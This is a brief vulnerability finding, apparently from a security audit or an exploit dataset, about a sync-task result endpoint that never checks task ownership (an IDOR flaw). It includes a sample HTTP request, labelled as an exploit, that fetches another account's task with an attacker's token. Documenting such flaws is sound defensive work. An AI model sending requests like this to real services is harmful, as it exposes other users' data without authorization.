diagnosis: The route fetches synchronization metadata directly from the lifespan sync_registry using an unvalidated task_id. It never checks if task_data.initiator_user_id == current_user.id, allowing authenticated users to monitor and extract sync destination targets of other accounts.
exploit_request:
GET /api/v1/sync/tasks/tsk_cloud_sync_55102/result HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_jwt>
